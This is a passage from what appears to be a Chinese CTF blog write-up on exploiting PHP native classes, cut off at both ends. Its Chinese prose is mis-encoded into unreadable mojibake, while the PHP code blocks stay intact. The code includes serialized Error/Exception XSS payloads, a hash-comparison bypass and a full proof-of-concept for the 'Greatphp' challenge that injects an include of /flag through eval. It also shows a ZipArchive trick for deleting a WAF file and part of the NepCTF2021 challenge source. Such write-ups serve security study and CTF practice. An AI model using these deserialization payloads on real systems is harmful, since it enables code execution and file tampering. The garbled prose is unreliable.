class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041104505.png" alt="image-20221004110427423"></p><p>ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œäº†<code>system(&#39;whoami&#39;)</code></p><h2 id="Error-x2F-Exceptionå†…ç½®ç±»è¿›è¡Œ-XSS"><a href="#Error-x2F-Exceptionå†…ç½®ç±»è¿›è¡Œ-XSS" class="headerlink" title="Error&#x2F;Exceptionå†…ç½®ç±»è¿›è¡Œ XSS"></a>Error&#x2F;Exceptionå†…ç½®ç±»è¿›è¡Œ XSS</h2><p><strong>Errorç±»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php7</span><br><span class="line">2.å¼€å¯æŠ¥é”™</span><br></pre></td></tr></table></figure><p>Errorç±»ç”±äºå…¶å†…éƒ¨çš„<code>__toString</code>æ–¹æ³•ï¼Œåœ¨php7ç¯å¢ƒä¸‹å¯èƒ½ä¼šå­˜åœ¨XSSæ¼æ´ï¼Œåœ¨æ„é€ phpååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ‰ä¸ªPOPé“¾éš¾ä»¥æ„é€ æˆ–è€…èµ°ä¸é€šï¼Œå¯ä»¥å°è¯•XSS</p><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Error xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041049324.png" alt="image-20221004104902256"></p><p><strong>Exception</strong>ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php5ã€7</span><br><span class="line">2.å¼€å¯æŠ¥é”™</span><br></pre></td></tr></table></figure><p>åŸç†ä¸€æ ·</p><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Exception xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041050313.png" alt="image-20221004105002244"></p><h2 id="Error-x2F-Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#Error-x2F-Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="Error&#x2F;Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>Error&#x2F;Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h2><p><strong>Error</strong> æ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041105289.png" alt="image-20221004110557213"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å±æ€§</span><br><span class="line"></span><br><span class="line">message é”™è¯¯æ¶ˆæ¯å†…å®¹</span><br><span class="line"></span><br><span class="line">code é”™è¯¯ä»£ç </span><br><span class="line"></span><br><span class="line">file æŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">line æŠ›å‡ºé”™è¯¯çš„è¡Œæ•°</span><br><span class="line"></span><br><span class="line">previous ä¹‹å‰æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="line"></span><br><span class="line">string å­—ç¬¦ä¸²å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br><span class="line"></span><br><span class="line">trace æ•°ç»„å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br></pre></td></tr></table></figure><p>**Exception **æ˜¯æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041106331.png" alt="image-20221004110645251"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å±æ€§</span><br><span class="line"></span><br><span class="line">message å¼‚å¸¸æ¶ˆæ¯å†…å®¹</span><br><span class="line"></span><br><span class="line">code å¼‚å¸¸ä»£ç </span><br><span class="line"></span><br><span class="line">file æŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">line æŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·</span><br><span class="line"></span><br><span class="line">previous ä¹‹å‰æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="line"></span><br><span class="line">string å­—ç¬¦ä¸²å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br><span class="line"></span><br><span class="line">trace æ•°ç»„å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œåœ¨è¿™ä¸¤ä¸ªç±»é‡Œä¹Ÿæœ‰__toString æ–¹æ³•</p><p>çœ‹çœ‹ä¼šè¿”å›ä»€ä¹ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: test in D:\phpstudy_pro\WWW\lesson\10.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿”å›äº†é”™è¯¯ä¿¡æ¯â€testâ€å’Œé”™è¯¯åœ¨å“ªè¡Œâ€2â€,ä½†æ˜¯ä¼ å…¥çš„é”™è¯¯ä»£ç â€1â€å¹¶æ²¡æœ‰è¢«å›æ˜¾å‡ºæ¥</p><p>çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5å:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1å:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041109722.png" alt="image-20221004110918646"></p><p>æ‰€ä»¥å¯ä½¿ç”¨è¿™ä¸¤ä¸ªç±»ç»•è¿‡å“ˆå¸Œçš„åˆ¤æ–­ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯<strong>Error</strong>ç±»æ˜¯ä»php7æ‰å¼€å§‹å¼•å…¥çš„ï¼Œè€Œ<strong>Exception</strong>ç±»ä»php5å°±å¼€å§‹å¼•å…¥äº†</p><h3 id="2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp"><a href="#2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp" class="headerlink" title="[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp"></a>[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç»å…¸çš„å“ˆå¸Œå€¼åˆ¤æ–­ç»•è¿‡é¢˜ï¼Œä½¿ç”¨Error&#x2F;Exceptionç±»ç»•è¿‡</p><p>å› ä¸ºè¿‡æ»¤äº†å°æ‹¬å·ï¼Œå¯¼è‡´æ— æ³•ä½¿ç”¨å‡½æ•°ï¼Œå¯ä»¥ç”¨includeç›´æ¥åŒ…å«&#x2F;flag;è¿‡æ»¤äº†å¼•å·ï¼Œå¯ä»¥ç”¨urlå–åç»•è¿‡</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure><p>åœ¨$strå‰é¢å†åŠ ä¸Šä¸€ä¸ª<code>?&gt;</code>æ˜¯å› ä¸ºException ç±»ä¸ Error çš„ __toString æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ— ç”¨çš„ä¿¡æ¯â€Error:â€¦â€¦â€æ‰€ä»¥è¦å…ˆç”¨?&gt;é—­åˆä¸€ä¸‹ï¼Œå˜æˆ<code>eval(&quot;...Error: ?&gt;&lt;?php shell ?&gt;&quot;)</code>ï¼Œè¿™æ ·æ‰èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><h2 id="ZipArchive-ç±»åˆ é™¤æ–‡ä»¶"><a href="#ZipArchive-ç±»åˆ é™¤æ–‡ä»¶" class="headerlink" title="ZipArchive ç±»åˆ é™¤æ–‡ä»¶"></a>ZipArchive ç±»åˆ é™¤æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†</span><br></pre></td></tr></table></figure><p>ZipArchiveç±»ä¸­å­˜åœ¨ä¸€ä¸ª<strong>open</strong>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041110028.png" alt="image-20221004111056943"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤</p><p>æ‰€ä»¥åœ¨åšé¢˜æ—¶å¯ä»¥åˆ©ç”¨ZipArchiveç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤æ‰wafæ–‡ä»¶</p><h3 id="NepCTF2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#NepCTF2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="NepCTF2021 æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>NepCTF2021 æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span 